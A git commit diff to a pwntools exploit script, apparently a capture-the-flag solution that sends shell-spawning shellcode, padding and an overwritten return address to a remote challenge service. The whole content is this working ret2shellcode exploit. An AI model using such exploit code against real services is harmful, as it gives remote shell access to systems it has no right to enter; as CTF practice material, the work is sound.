3ceb0def9f401d6eab5fdf8deb45aa7718557af1
Ethan Lai <58878526+wh00am1@users.noreply.github.com>
2020-08-23 22:14:28 +0800

    Update ret2sc.py

--- isc.taiwan-te.ch/ret2sc.py
+++ isc.taiwan-te.ch/ret2sc.py
@@ -10,7 +10,7 @@ context.arch = 'amd64'
 
 p = remote('isc.taiwan-te.ch', 10002)
 payload = asm(shellcraft.sh())
-payload += '\0'* 24
+payload += 'A'* 24
 payload += p64(0x601060) # main <+45>: lea rsi,[rip+0x200a75](0x601060 <message>)
 p.sendline(payload)
 
